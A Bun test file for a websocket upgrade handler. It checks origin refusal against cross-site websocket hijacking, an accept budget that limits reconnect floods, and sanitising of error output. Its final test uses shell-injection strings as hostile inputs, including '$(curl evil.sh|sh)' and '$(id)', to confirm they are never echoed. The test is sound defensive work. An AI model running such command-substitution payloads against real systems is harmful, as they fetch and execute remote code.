// Two refusals the upgrade owes before a socket exists. The ORIGIN: a websocket carries the
// session cookie and no CORS applies to it, so a page on a sibling host could otherwise open a
// socket as the visitor (cross-site websocket hijacking). And the ACCEPT BUDGET, spent only by an
// upgrade that authenticated — one client with no credential must not starve every reconnect.
import { describe, expect, test } from 'bun:test';
import { frozenClock, userActor } from '@ultimat3/core';
import { SocketOriginRefusedError } from './errors';
import type { SyncAuthenticator } from './sync-auth';
import { handleUpgrade, type UpgradeDeps, type UpgradeTarget } from './sync-upgrade';
import { AcceptBudget } from './thundering-herd';

const alice = userActor({ id: 'alice', orgId: 'o1' });

const upgrades = (): { server: UpgradeTarget; count: () => number } => {
  let taken = 0;
  return {
    server: {
      upgrade: () => {
        taken += 1;
        return true;
      },
      requestIP: () => null,
    },
    count: () => taken,
  };
};

const deps = (overrides: Partial<UpgradeDeps> = {}): UpgradeDeps => ({
  path: '/_x/sync',
  buildId: 'build-1',
  maxConnections: 100,
  accept: new AcceptBudget({ perSecond: 100, burst: 100, clock: frozenClock(0) }),
  rng: () => 0.5,
  ready: () => true,
  socketCount: () => 0,
  newSocketId: () => 'sock-1',
  healthDetailPeers: ['loopback'],
  onGranted: () => undefined,
  onUngranted: () => undefined,
  ...overrides,
});

const dial = (headers: Record<string, string> = {}, url = 'https://app.example.com/_x/sync') =>
  new Request(url, { headers });

describe('the upgrade refuses a foreign origin', () => {
  test('a page on the node’s own origin is admitted', async () => {
    const { server, count } = upgrades();
    expect(
      await handleUpgrade(deps(), dial({ origin: 'https://app.example.com' }), server),
    ).toBeUndefined();
    // `x dev`: the page and the socket are one listener on localhost.
    expect(
      await handleUpgrade(
        deps(),
        dial({ origin: 'http://localhost:3000' }, 'http://localhost:3000/_x/sync'),
        server,
      ),
    ).toBeUndefined();
    expect(count()).toBe(2);
  });

  // Cookies are not isolated by port or by scheme, so a page on the same HOST NAME is not this
  // app: another port is another listener, and plain http is content anyone on the path can write.
  for (const origin of [
    'https://app.example.com:8443',
    'http://app.example.com',
    'http://app.example.com:3000',
  ]) {
    test(`the same host name on another port or scheme is refused: ${origin}`, async () => {
      const { server, count } = upgrades();
      const response = await handleUpgrade(deps(), dial({ origin }), server);
      expect(response?.status).toBe(403);
      expect(count()).toBe(0);
    });
  }

  test('a page on another port is admitted once its origin is listed', async () => {
    const { server } = upgrades();
    const node = deps({ allowedOrigins: ['http://app.example.com:3000'] });
    const url = 'http://app.example.com:3001/_x/sync';
    expect(
      await handleUpgrade(node, dial({ origin: 'http://app.example.com:3000' }, url), server),
    ).toBeUndefined();
    expect(
      (await handleUpgrade(node, dial({ origin: 'http://app.example.com:3002' }, url), server))
        ?.status,
    ).toBe(403);
  });

  // Behind a TLS-terminating proxy the node sees plain http for a host its pages are served on
  // over https. The declared origin is that host's public spelling, so the as-seen one is not.
  test('a declared origin for the node’s own host replaces the origin the node sees', async () => {
    const { server } = upgrades();
    const node = deps({ allowedOrigins: ['https://app.example.com'] });
    const url = 'http://app.example.com/_x/sync';
    expect(
      await handleUpgrade(node, dial({ origin: 'https://app.example.com' }, url), server),
    ).toBeUndefined();
    expect(
      (await handleUpgrade(node, dial({ origin: 'http://app.example.com' }, url), server))?.status,
    ).toBe(403);
  });

  // The PaaS and the Ingress rungs: TLS ends at a proxy, so the node is reached over plain http
  // for a host its pages are served on over https — and a browser sends no `sec-fetch-site` on a
  // websocket handshake (measured, Chrome: `Origin` and nothing else). With no `APP_URL` the
  // scheme is not knowable here, so the https spelling of the SAME host and port is this app too.
  // Refusing it admitted only `http://` — the one spelling such a deployment never serves.
  test('a node reached over plain http admits the https spelling of its own host and port', async () => {
    const { server, count } = upgrades();
    const url = 'http://app.example.com/_x/sync';
    expect(
      await handleUpgrade(deps(), dial({ origin: 'https://app.example.com' }, url), server),
    ).toBeUndefined();
    expect(count()).toBe(1);
    for (const origin of [
      'https://app.example.com:8443', // another port is still another listener
      'https://www.example.com', // and another host another site
    ]) {
      expect((await handleUpgrade(deps(), dial({ origin }, url), server))?.status).toBe(403);
    }
    // The port is part of it: a node on :3001 admits https on :3001, never the bare host.
    const onPort = 'http://app.example.com:3001/_x/sync';
    expect(
      await handleUpgrade(deps(), dial({ origin: 'https://app.example.com:3001' }, onPort), server),
    ).toBeUndefined();
    expect(
      (await handleUpgrade(deps(), dial({ origin: 'https://app.example.com' }, onPort), server))
        ?.status,
    ).toBe(403);
  });

  // The origin the node sees comes from the `Host` header. With a `Domain=`-wide session cookie,
  // a sibling subdomain pointed at this node is "the node's own origin" by that reading.
  test('once an origin is declared, the Host-derived one is not admitted beside it', async () => {
    const { server, count } = upgrades();
    const node = deps({ allowedOrigins: ['https://app.example.com'] });
    const rebound = 'https://evil.example.com/_x/sync';
    const response = await handleUpgrade(
      node,
      dial({ origin: 'https://evil.example.com' }, rebound),
      server,
    );
    expect(response?.status).toBe(403);
    expect(count()).toBe(0);
    // The declared page is admitted whatever host the node was reached on.
    expect(
      await handleUpgrade(node, dial({ origin: 'https://app.example.com' }, rebound), server),
    ).toBeUndefined();
  });

  test('the browser’s own same-origin verdict is admitted whatever the node sees', async () => {
    const { server } = upgrades();
    const dialled = dial(
      { origin: 'https://app.example.com', 'sec-fetch-site': 'same-origin' },
      'http://app.example.com/_x/sync',
    );
    expect(await handleUpgrade(deps(), dialled, server)).toBeUndefined();
  });

  // A sibling subdomain is same-site, so a SameSite=Lax session cookie rides its socket.
  test('a sibling host is refused 403 X_SOCKET_ORIGIN_REFUSED, before authenticate runs', async () => {
    const { server, count } = upgrades();
    let asked = 0;
    const authenticate: SyncAuthenticator = () => {
      asked += 1;
      return Promise.resolve({ actor: alice });
    };
    const response = await handleUpgrade(
      deps({ authenticate }),
      dial({ origin: 'https://evil.example.com', 'sec-fetch-site': 'same-site' }),
      server,
    );
    expect(response?.status).toBe(403);
    const body = (await response?.json()) as { error?: { code?: string } };
    expect(body.error?.code).toBe('X_SOCKET_ORIGIN_REFUSED');
    expect(asked).toBe(0);
    expect(count()).toBe(0);
  });

  test('an origin the node was told about is admitted, exactly', async () => {
    const { server } = upgrades();
    const node = deps({ allowedOrigins: ['https://www.example.com'] });
    const url = 'https://sync.example.com/_x/sync';
    expect(
      await handleUpgrade(node, dial({ origin: 'https://www.example.com' }, url), server),
    ).toBeUndefined();
    const refused = await handleUpgrade(
      node,
      dial({ origin: 'https://www.example.com.evil.test' }, url),
      server,
    );
    expect(refused?.status).toBe(403);
  });

  // RFC 6455: a browser always sends Origin on the handshake. A client that sends none is not a
  // browser, so no visitor's cookie can be riding it.
  test('a dial with no Origin is a non-browser client and is not refused for it', async () => {
    const { server } = upgrades();
    expect(await handleUpgrade(deps(), dial(), server)).toBeUndefined();
  });
});

describe('the accept budget is spent only by an upgrade that authenticated', () => {
  test('a flood with no credential spends nothing, so a signed-in reconnect still gets in', async () => {
    const { server, count } = upgrades();
    const authenticate: SyncAuthenticator = (request) =>
      Promise.resolve(request.headers.get('cookie') === 'session=ok' ? { actor: alice } : null);
    const node = deps({
      authenticate,
      accept: new AcceptBudget({ perSecond: 1, burst: 1, clock: frozenClock(0) }),
    });
    for (let attempt = 0; attempt < 50; attempt += 1) {
      expect((await handleUpgrade(node, dial(), server))?.status).toBe(401);
    }
    expect(await handleUpgrade(node, dial({ cookie: 'session=ok' }), server)).toBeUndefined();
    expect(count()).toBe(1);
    // And the budget still binds the ones that did authenticate.
    expect((await handleUpgrade(node, dial({ cookie: 'session=ok' }), server))?.status).toBe(503);
  });
});

describe('a reconnect herd reaches authenticate bounded by the burst', () => {
  test('dials beyond the burst are shed before authenticate; a taken socket keeps its token', async () => {
    const { server, count } = upgrades();
    let inFlight = 0;
    let peak = 0;
    let open: () => void = () => undefined;
    const gate = new Promise<void>((resolve) => {
      open = resolve;
    });
    const authenticate: SyncAuthenticator = async () => {
      inFlight += 1;
      peak = Math.max(peak, inFlight);
      await gate;
      inFlight -= 1;
      return { actor: alice };
    };
    const accept = new AcceptBudget({ perSecond: 1, burst: 2, clock: frozenClock(0) });
    const node = deps({ authenticate, accept });
    const herd = Array.from({ length: 6 }, () => handleUpgrade(node, dial(), server));
    open();
    const answers = await Promise.all(herd);
    expect(peak).toBe(2);
    expect(answers.filter((answer) => answer?.status === 503)).toHaveLength(4);
    expect(count()).toBe(2);
    expect(accept.tokens).toBe(0);
  });

  test('a refused credential gives its reserved token back', async () => {
    const { server } = upgrades();
    const accept = new AcceptBudget({ perSecond: 1, burst: 1, clock: frozenClock(0) });
    const node = deps({ authenticate: async () => null, accept });
    expect((await handleUpgrade(node, dial(), server))?.status).toBe(401);
    expect(accept.tokens).toBe(1);
  });

  test('an authenticator that throws gives its reserved token back', async () => {
    const { server } = upgrades();
    const accept = new AcceptBudget({ perSecond: 1, burst: 1, clock: frozenClock(0) });
    const node = deps({
      authenticate: () => Promise.reject(new TypeError('token service down')),
      accept,
    });
    expect((await handleUpgrade(node, dial(), server))?.status).toBe(503);
    expect(accept.tokens).toBe(1);
  });
});

describe('the origin refusal', () => {
  const refusal = (asked: string | null, admitted: readonly string[] = []) =>
    new SocketOriginRefusedError({ reason: 'x', asked, admitted });

  // A fix is a command an agent can run, never a sentence — and it names the origin that asked.
  test('its fix is the export that admits the origin that asked', () => {
    expect(refusal('https://app.example.com').fix).toStartWith(
      'export APP_URL=https://app.example.com ',
    );
  });

  test('its cause names the origin that asked and every origin the node admits', () => {
    const { cause } = refusal('https://app.example.com/', ['https://www.example.com']);
    expect(cause).toContain('asked from https://app.example.com;');
    expect(cause).toEndWith('admits only https://www.example.com');
    expect(refusal('https://app.example.com').cause).toContain('no APP_URL declared');
  });

  // The header is the client's. Only what a URL parser reads as an origin travels, and only when
  // the shell screen carries it: anything else is a fixed word, in the cause and the fix alike.
  for (const hostile of [
    'https://x.test/$(curl evil.sh|sh)',
    '$(id)',
    'null',
    'http://[::1]:3000',
  ]) {
    test(`a header that is not a plain origin is never echoed: ${hostile}`, () => {
      const error = refusal(hostile);
      expect(`${error.cause}${error.fix}`).not.toContain('$(');
      expect(`${error.cause}${error.fix}`).not.toContain('[');
      if (URL.parse(hostile) === null || hostile.includes('[')) {
        expect(error.fix).toStartWith('export APP_URL=https://www.example.com ');
      }
    });
  }
});
